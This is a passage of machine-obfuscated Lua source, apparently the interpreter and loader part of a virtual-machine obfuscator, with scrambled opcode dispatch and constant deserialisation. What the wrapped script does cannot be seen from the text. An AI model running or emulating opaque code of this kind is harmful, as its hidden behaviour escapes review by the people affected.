c=D[iO];I=(c+L[iO]-0X1);K[c]=K[c](kO(K,c+0X1,I));I=(c);else local w,c,v,l=0X25;while true do if w==0x1.28p5 then c=(-17301489);w=(0X1B+((F+F>>0x8<=F and w or w)|F));elseif w==64.0 then l=U[iO];w=-66+(((F&F)+F==w and F or w)+F);elseif w==0x1.fp4 then v=(F);w=0X95+(((F~=w and w or F)>w and w or w)-F-F);elseif w==0X1.C8P6 then l=(l-v);w=0x8+((F&w)-w<<0X6<w and F or F);elseif w==0x1.48p5 then v=F;break;end;end;l=(l&v);w=0X2f;while true do if w==47.0 then v=U[iO];w=66+((w+w&F~F)-F);elseif w==66.0 then l=l+v;v=(15);w=187+((w>>(J[6]('\62i\56',"\0\u{0}\0\0\0\0\0\v")))-w-w|w);elseif w==0X1.c8P5 then l=(l<<v);w=0x3d+(((F|F)+w|w)>>4);elseif w==68.0 then v=F;break;end;end;w=0X48;while true do if w~=72.0 then if not(l)then else l=U[iO];end;if not l then l=(U[iO]);end;break;else l=l>v;w=-98+(w~F|w|F|F);end;end;v=(U[iO]);l=l<v;w=(9);while true do if w<=9.0 then if l then l=(F);end;w=0X33+((F>>w<=F and w or F)&F>=F and w or F);else if not(w>35.0)then v=(19);l=l<<v;break;else if not l then l=U[iO];end;w=35+(((w>=w and w or w)+F&F)>>0XF);end;end;end;local V;w=(0X7B);while true do if w<0X1.EP4 then U[iO]=(c);break;elseif w<0X1.94p6 and w>0x0.0P0 then l=l|v;w=71+((w>>w)-w-F>F and F or w);elseif w>0X1.94P6 then v=(F);w=-2+((w+F+w~F)&F);else if w<123.0 and w>30.0 then c=(c+l);w=(((F<=w and w or F)>>15)+w>>0X17);end;end;end;c=(K);w=0X5d;while true do if w<23.0 then v=v[V];break;elseif w>0X1.7p4 and w<0x1.74p6 then v=(K);w=(78+((F>>w<<w)-w~F));elseif w>0x1.8p4 then l=jO[iO];w=(0X17+((w~=w and w or w)+F&w~w));elseif w>10.0 and w<0x1.8p4 then V=L[iO];w=(-0X17+((w>F and F or F)+w|F>F and F or F));end;end;c[l]=v;end;end;else if not(F>=0X23)then K[L[iO]]=jO;else if F~=0X24 then K[jO[iO]]=(K[D[iO]]<<K[L[iO]]);else(K)[jO[iO]]=(K[L[iO]]..K[D[iO]]);end;end;end;end;end;else if not(F>=0X4b)then if F>=0X3E then if not(F>=0X44)then if F<0X41 then if F<0x3f then local zO=(x[iO]);local w=(zO[11]);local c=(#w);local l=c>0 and{};local v=t(zO,l);K[jO[iO]]=(v);if not(l)then else for V=1,c do zO=w[V];v=zO[3];local c=(zO[2]);if v==0 then if not(not A)then else A=({});end;local w=(A[c]);if not w then w=({[0X2]=c,[0x3]=K});A[c]=(w);end;l[V-1]=w;elseif v==1 then l[V-0X1]=K[c];else(l)[V-1]=UO[c];end;end;end;else if F==64 then S=(CO[1]);tO=CO[0X3];e=CO[0X02];CO=CO[4];else K[L[iO]]=K[D[iO]]&K[jO[iO]];end;end;else if F<0x42 then repeat local V=(A);if V then for l,c in p,V do if l>=1 then(c)[0X3]=c;(c)[0X01]=K[l];c[2]=(1);(V)[l]=(nil);end;end;end;until true;return;else if F~=0x43 then(K)[L[iO]]=(K[D[iO]]>=K[jO[iO]]);else K[D[iO]]=K[jO[iO]]&cO[iO];end;end;end;else if F<71 then if not(F<0X045)then if F==70 then(K)[L[iO]]=-K[jO[iO]];else(K)[L[iO]]=(K[D[iO]]==OO[iO]);end;else K[L[iO]]=({});end;else if F<73 then if F~=72 then local c=(UO[D[iO]]);K[jO[iO]]=c[3][c[0X2]];else K[jO[iO]]=K[L[iO]]>>K[D[iO]];end;else if F==0X4A then local l,c,v,V=0x18;repeat if l<0X1.8P4 and l>0x1.4p3 then c=(U[iO]);l=(-0X53+(((l~l)>>l)+F~l));elseif l<0x1.7P4 then V=F;break;else if l>23.0 then v=0X22;l=(97+(((F|F)>>l&F)-F));end;end;until false;c=c~V;l=0X2e;while true do if l==46.0 then V=U[iO];l=(0x19+(((F==F and F or F)+l~=F and F or l)-l));else if l~=53.0 then if l==16.0 then V=0X4;break;end;else c=c+V;l=(-122+((((l>l and F or l)|l)<<0X2)-F));end;end;end;l=(0X8);repeat if not(l>17.0)then if l<=0x1.0p3 then c=(c>>V);l=71+(((F~l)&l)<<l&F);else c=(c-V);break;end;else if l~=0x1.e8P6 then V=F;c=c+V;l=-9529458714+(((l==F and F or l)<<0x1B~F)+F);else V=U[iO];l=(-0Xdcf+(((l<=l and F or F)>>0X1)+F<<5));end;end;until false;l=(106);while true do if l>65.0 then V=(F);l=-41+((l-F<=l and F or F)|l|l);elseif l<106.0 and l>0X1.6P5 then c=(c-V);l=-0X1e+(((F>l and l or F)<=l and l or l)>>23~F);else if not(l<65.0)then else V=U[iO];break;end;end;end;c=(c<V);l=(0X55);repeat if l==85.0 then if not(c)then else c=F;end;l=-111+(((l~F)<<0X0~l)+l);else if l~=48.0 then if l~=79.0 then else c=c~V;break;end;else if not c then c=(F);end;V=(U[iO]);l=(0X5+(((F+F==l and l or l)~F)-l));end;end;until false;v=v+c;l=(0X4a);repeat if l>0X1.08P5 then(U)[iO]=v;v=K;l=0X21+((F>>(J[0x6]('\62i\x38',"\u{000}\0\0\0\0\0\0\z\u{E}"))|F)>>0X12>>0Xb);else if not(l<33.0)then if l<74.0 and l>12.0 then c=(L[iO]);V=(jO);l=(-62+(((l==l and l or F)>l and F or l)|F==l and l or F));end;else v[c]=V;break;end;end;until false;else K[jO[iO]]=(K);end;end;end;end;else if not(F>=56)then if not(F<0X35)then if F>=54 then if F==55 then repeat local c=A;if c then for l,V in p,c do if not(l>=0X1)then else V[0X3]=(V);(V)[0X1]=K[l];(V)[2]=(0x1);c[l]=nil;end;end;end;until true;return K[L[iO]];else for c=D[iO],L[iO]do(K)[c]=(nil);end;end;else local c=(jO[iO]);K[c]=K[c](kO(K,c+0X001,I));I=c;end;else if not(F<51)then if F~=0X34 then local CO,c,l,V=F,41;while true do if c==0X1.48p5 then V=(U[iO]);c=0X41+((c~F~=F and c or F)+F-c);elseif c==116.0 then CO=(CO-V);break;end;end;local v=(-9223372036854775721);V=(F);c=0X55;while true do if not(c<=0x1.3cP6)then if c~=98.0 then CO=(CO-V);c=(-0x58+(((F&c<=F and c or c)==F and c or c)+F));else CO=(CO|V);V=F;CO=(CO~V);break;end;else if c~=0x1.3cP6 then V=(U[iO]);c=(127+(((c&F~F)&F)-F));else CO=CO~V;V=U[iO];c=(47+(((F<<31)+c>=F and F or F)<<0X0));end;end;end;local w;c=(0X68);while true do if c<=90.0 then if c==39.0 then w=(6);c=102+(((c<F and c or c)~c)+c-F);else V=(V[w]);w=('>\1058');c=(0X71+((F+F+F~c)>>(J[6]("\62i8",'\0\0\x00\0\u{0}\u{00}\z \0\z \23'))));end;else if c>=113.0 then l=("\0\0\0\z\0\0\0\0\30");break;else V=(J);c=-0X43+((c~=F and c or c)>>4&F~c);end;end;end;V=V(w,l);CO=(CO<<V);c=64;while true do if c<0X1.0p6 then V=F;CO=(CO-V);break;else V=(0X1f);CO=(CO<<V);c=-0X21+(((c+c>c and F or c)>c and c or F)>F and c or c);end;end;c=(0X43);while true do if c<70.0 then v=(v+CO);c=3+((c&F<=F and F or c)|F~=c and c or F);elseif c>0X1.0cP6 and c<0x1.b4P6 then(U)[iO]=v;c=0X03a+((F<<0xb)+F+c>F and F or c);elseif not(c>70.0)then else v=(K);break;end;end;CO=(jO[iO]);c=(50);while true do if c<105.0 then V=(K);w=L[iO];c=0X69+(((F+F|c)&F)-c);elseif c>50.0 then V=(V[w]);break;end;end;c=0x2;while true do if c==0x1.0p1 then w=K;c=0X79+((((c>F and F or F)|F)~F)<<c);elseif c~=121.0 then else l=D[iO];break;end;end;w=w[l];V=V..w;v[CO]=(V);else local c=(UO[D[iO]]);(c[3])[c[0X2]]=K[jO[iO]];end;else local c=(L[iO]);I=c+jO[iO]-0X1;(K[c])(kO(K,c+0x1,I));I=c-0X1;end;end;else if not(F<0X3B)then if not(F>=0X3C)then(K)[D[iO]]=(UO[L[iO]][OO[iO]]);else if F==0X3d then(K)[D[iO]]=L;else local c=(L[iO]);K[c]=K[c](K[c+0X1],K[c+0X2]);I=c;end;end;else if F>=0X39 then if F==58 then repeat local c=(A);if not(c)then else for l,V in p,c do if l>=1 then(V)[0X3]=(V);(V)[1]=K[l];(V)[0X2]=(1);(c)[l]=(nil);end;end;end;until true;return K[jO[iO]]();else K[D[iO]]=J[jO[iO]];end;else(K[D[iO]])[OO[iO]]=(cO[iO]);end;end;end;end;else if F>=88 then if not(F>=0X5e)then if F>=91 then if F>=0X5C then if F==0x05d then repeat local l=(A);if not(l)then else for V,c in p,l do if V>=0X1 then(c)[3]=(c);c[1]=(K[V]);(c)[2]=(1);(l)[V]=nil;end;end;end;until true;return kO(K,D[iO],I);else(K)[D[iO]]=m;end;else local c=L[iO];(K)[c]=K[c](K[c+1]);I=c;end;else if not(F<0X59)then if F==90 then local c=(false);S=(S+e);if not(e<=0X0)then c=S<=tO;else c=S>=tO;end;if c then K[D[iO]+3]=(S);iO=(jO[iO]);end;else I=(L[iO]);K[I]();I=I-1;end;else(K)[L[iO]]=(K[D[iO]]>K[jO[iO]]);end;end;else if F<97 then if not(F<0X5f)then if F~=0x60 then if not(K[jO[iO]])then else iO=(L[iO]);end;else if not(K[L[iO]]<=K[jO[iO]])then iO=(D[iO]);end;end;else K[jO[iO]]=(K[L[iO]]%K[D[iO]]);end;else if F>=99 then if F==100 then K[D[iO]]=(cO[iO]);else K[jO[iO]]=(K[D[iO]]<=K[L[iO]]);end;else if F==98 then repeat local c=A;if not(c)then else for S,l in p,c do if S>=0x1 then l[3]=l;l[1]=K[S];l[2]=(0X1);(c)[S]=nil;end;end;end;until true;local c=(L[iO]);return K[c](kO(K,c+1,I));else if K[jO[iO]]==cO[iO]then iO=D[iO];end;end;end;end;end;elseif not(F>=0x51)then if F<78 then if F<76 then K[L[iO]]=x[iO]^K[jO[iO]];else if F~=0x4d then if K[jO[iO]]~=K[D[iO]]then else iO=L[iO];end;else(K)[D[iO]]=(K[jO[iO]]%cO[iO]);end;end;else if F<79 then local e,S,c=(122);while true do if e<60.0 then S=(0X9);e=(-12451702+((((F<e and F or F)|e)<<e)-F));elseif e<0x1.38p6 and e>0x1.1P4 then c=(c<<S);e=29+((e|e==e and F or F)|F<e and F or F);elseif e<0x1.Acp6 and e>0X1.Ep5 then c=(c<S);break;elseif e>0x1.38p6 and e<122.0 then S=U[iO];e=(-7180648221+((e<<0X1A)-e-e|e));elseif not(e>107.0)then else c=F;e=(-105+((F>>31<e and e or F)+e<=e and F or e));end;end;e=112;local V=(-117);while true do if e==0X1.CP6 then if c then c=U[iO];end;e=0Xf+(((F<<0x1F<=F and F or F)>e and e or e)>>0X17);elseif e~=15.0 then if e==34.0 then S=0X0;break;end;else if not(not c)then else c=F;end;e=-0x1D+(((F~=e and e or e)|e<e and e or F)-e);end;end;c=(c<<S);S=F;c=c>S;e=0X74;while true do if e==116.0 then if c then c=U[iO];end;e=(-49+(((F<=e and F or F)|F|e)&e));elseif e==67.0 then if not(not c)then else c=(F);end;e=(-8+(((F~=e and F or F)|e)&e<F and F or F));elseif e~=70.0 then else S=F;break;end;end;c=c==S;e=(124);while true do if e==124.0 then if c then c=F;end;e=-0x1EfFFfd5+(((e<<0X0018>e and e or e)<=e and e or F)<<0X16);elseif e==0X1.58p5 then if not(not c)then else c=(F);end;e=-29+(((F>>3<=e and F or F)>e and e or e)|e);elseif e==14.0 then S=F;break;end;end;local l;e=(66);while true do if e~=57.0 then c=(c+S);S=(U[iO]);c=(c+S);e=(-9927+((e>>21|F)<<10>>0x3));else S=(F);break;end;end;e=(0X6D);while true do if e<=0x1.68P6 then if not(e<=28.0)then if e==39.0 then U[iO]=(V);e=-27+((e<<(J[0X6]("\60\x698",'\2\0\0\0\0\0\0\0'))&F>=e and F or e)+F);else V=K;e=(23+((e>>27~e)<<9>>0x9));end;else S=(K);break;end;else if e>0x1.Ap6 then if e~=0x1.b4p6 then c=(L[iO]);e=-137438953443+((e|F)-F-F>>0X1B);else c=c~S;e=(0X1A+(((e|e)~F)&F>=e and e or F));end;else V=V+c;e=(-39+((e+e-e==e and e or F)<F and e or F));end;end;end;e=(0X46);while true do if e<109.0 then l=(jO[iO]);e=107+(e+F-F>>0X1&F);elseif not(e>0x1.18p6)then else S=(S[l]);l=(x[iO]);break;end;end;S=S[l];(V)[c]=S;else if F==80 then(K)[L[iO]]=D;else K[L[iO]]=(K[jO[iO]]^x[iO]);end;end;end;else if F>=0X54 then if not(F<0X56)then if F~=87 then(K)[D[iO]]=(K[L[iO]]+OO[iO]);else(K)[D[iO]]=U;end;else if F==0X55 then M=jO[iO];lO,b=s(...);for c=1,M do K[c]=(b[c]);end;H=(M+0X1);else(K)[jO[iO]]=K[D[iO]]|K[L[iO]];end;end;else if F<82 then(K)[L[iO]]=(K[jO[iO]]-x[iO]);else if F~=0X53 then K[L[iO]]=(K[jO[iO]]^K[D[iO]]);else local S=(lO-M-0X1);if not(S<0X0)then else S=(-1);end;local c,l=0,(D[iO]);for D=l,l+S do K[D]=b[H+c];c=(c+1);end;I=(l+S);end;end;end;end;end;end;iO=iO+1;until false;end;return N;end);break;else DO=function()local D;for c=0x39,0Xb1,101 do if c==0X39 then D=MO();else if c~=0X9e then else f=(f+D);break;end;end;end;return y(j,f-D,f-0X1);end;if not(not Z[20439])then X=(Z[0X4fD7]);else X=(99+((Z[0X663F]~Z[0x1e4e]>=Z[0X5adb]and Z[0X58E4]or Z[22469])-_[4]==Z[0x663f]and Z[18358]or X));(Z)[0x4FD7]=X;end;end;end;until false;local S,s,f,D;X=32;while true do if X==32.0 then S=function()local K,c,M,e,L,j,V=(0X8);while true do if K>0x1.1Cp6 then L=h(c);j=h(c);V=h(c);break;elseif K<0x1.e8p6 and K>8.0 then K=(0X7A);M=({nil,Y,Y,Y,nil,Y,nil,nil,nil,nil,Y});e=h(c);elseif K<71.0 then c=MO()-0xd394;K=0x47;end;end;local H,A,U=h(c),h(c),h(c);goto Q;::k::;M[1]=(L);goto O;::S::;(M)[0X3]=H;goto U;::O::;goto S;::U::;(M)[O]=j;goto B;::L::;goto k;::Q::;goto L;::B::;(M)[0X7]=A;(M)[Q]=(V);(M)[0xa]=(U);(M)[0X9]=e;goto e;::R::;(M)[SO]=MO();(M)[0X6]=MO();goto d;::e::;for v=0X1,c do local I,Q,O,c,b;for l=0X1f,0X6d,0x12 do if l==31 then I=i();else if l==49 then Q=i();elseif l==0x67 then b=(Q&0x7);break;elseif l==0X55 then c=i();elseif l~=67 then else O=i();end;end;end;local l,m,i;l=(O&n);goto W;::r::;i=(Q>>0x3);goto H;::W::;m=(c&0X7);goto r;::H::;local y,Q=(O>>3);for O=0X54,0x118,0X62 do if O>182.0 then H[v]=(i);elseif O>84.0 and O<0X1.18p8 then(U)[v]=(y);(j)[v]=Q;elseif not(O<0x1.6CP7)then else Q=(c>>0x3);end;end;(L)[v]=(I);if m==0X0 then if u then local c,L,O=28;while true do if not(c>28.0)then c=(0x4b);L=(G[Q]);O=#L;else if not(c>=0x1.2cP6)then L[O+0X2]=v;break;else c=46;(L)[O+0X1]=(M);end;end;end;(L)[O+3]=0X9;else e[v]=(G[Q]);end;elseif m==2 then(j)[v]=(Q);elseif m==W then local c=(#LO);goto E;::V::;(LO)[c+0X2]=v;goto o;::E::;(LO)[c+W]=e;goto V;::o::;LO[c+0X3]=Q;end;if b==d then if not(u)then V[v]=(G[i]);else local c=G[i];local j=(#c);for O=0X7D,0x133,0X71 do if O<238.0 then(c)[j+1]=(M);elseif not(O>0X1.F4P6)then else c[j+2]=v;break;end;end;c[j+0X3]=4;end;elseif b==0x2 then(H)[v]=i;elseif b~=1 then else local c=#LO;(LO)[c+0X1]=V;goto b;::Z::;(LO)[c+T]=i;goto K;::b::;(LO)[c+SO]=v;goto Z;::K::;end;if l==d then if not(u)then(A)[v]=(G[y]);else local i,c;i=(G[y]);c=(#i);i[c+0x1]=M;i[c+2]=v;i[c+0x03]=(7);end;elseif l==0X02 then(U)[v]=(y);elseif l==W then local l,c=(126);while true do if not(l>0X1.14P6)then l=0X60;(LO)[c+1]=(A);else if l~=0X1.F8p6 then(LO)[c+0X2]=(v);LO[c+3]=(y);break;else c=#LO;l=0X0045;end;end;end;end;end;goto R;::d::;local j,c=(MO());K=(0X63);while true do if K==0x1.98p6 then M[BO]=c;for l=W,j do local O;for U=97,115,18 do if U==0X073 then if not(P[O])then local i=({[0X2]=O>>2,[3]=O&0x3});(P)[O]=(i);c[l]=i;else c[l]=(P[O]);end;else if U==97 then O=MO();end;end;end;end;return M;else K=(0X66);c=h(j);end;end;end;s=(function()local c,j;P={};c=(MO()-60571);goto y;::T::;G=h(c);j=(r()~=0X0);u=(j);goto q;::y::;goto T;::q::;local l,O;goto v;::m::;O=h(l);goto f;::v::;for U=0x1,c do local M,i;for c=17,116,0X63 do if c==17 then M=(Y);elseif c==116 then i=r();end;end;if not(i>z)then if i==140.0 then M=DO();else M=R();end;else if not(i<161.0)then M=r()==1;else M=g();end;end;if not(j)then G[U]=(M);else(G)[U]=({[d]=M});end;end;l=MO()-9020;goto m;::f::;LO=h(l*3);local c;goto X;::_::;do return c;end;::Y::;c=(O[MO()]);goto I;::A::;for c=0X1,#LO,0X3 do LO[c][LO[c+0X1]]=(O[LO[c+2]]);end;goto s;::I::;G=(nil);goto h;::s::;if j then(J)[4]=G;(J)[5]=(O);end;goto Y;::h::;LO=(nil);P=nil;goto _;::X::;for c=0X1,l do(O)[c]=S();end;goto A;end);if not(not Z[21772])then X=Z[0x550C];else X=-0X37aE+(((_[0X7]-Z[0X4CC9]>=Z[8737]and Z[0x29AA]or Z[17809])&Z[22361])<<Z[0x04ef3]);Z[21772]=X;end;elseif X==82.0 then f=(function(...)return(...)();end);if not Z[3323]then X=-0X1a3086A6+(((_[0X6]<<Z[26175])-Z[0x3E92]>>Z[0X663F])-Z[16018]);(Z)[0Xcfb]=(X);else X=(Z[0XcFb]);end;elseif X==9.0 then D=s();(QO)[0X0]=({[2]=0x1,[0x3]=B({nil},{[o]=function(c,c,c)_ENV=(c);end,[C]=function(c,c)return _ENV;end})});if not Z[0x01e1E]then X=439387868+(((Z[22361]<<Z[0x4591]~_[1])>>Z[17809])-_[6]);Z[0X1E1E]=(X);else X=Z[7710];end;elseif X==84.0 then(J)[6]=GO;if not(not Z[0X6ee5])then X=(Z[28389]);else X=-58+((((Z[12779]~=Z[28794]and Z[4024]or _[9])|Z[28564])&X)+Z[0xCFB]);Z[28389]=X;end;elseif X==0x1.18P5 then D=t(D,QO)(s,q,E,f,R,r,k,_,a,t);if not Z[21248]then X=(0X5+((Z[0X707A]-Z[24418]|Z[22469])+Z[24418]&Z[18358]));(Z)[21248]=X;else X=(Z[0X5300]);end;else if X~=0X1.3P5 then else return t(D,QO);end;end;end;end)(0XB,5,string.pack,1,string,nil,3,string.gsub,0,select,table,'_\z  _\110\101\119i\x6Edex',"\x5F\95\105n\100\z e\120",0x1.18P7,2,string.unpack,4,7,function(...)(...)[...]=(nil);end,{},{P=string.char,F=string.byte,A=setmetatable,G=table.move,u=string.sub,D=table.unpack,S=string.unpack},{0X5E7,2911910031,0X0065a97295,3370532007,1112831773,439387847,2220733284,1043828221,3062548541})(...);











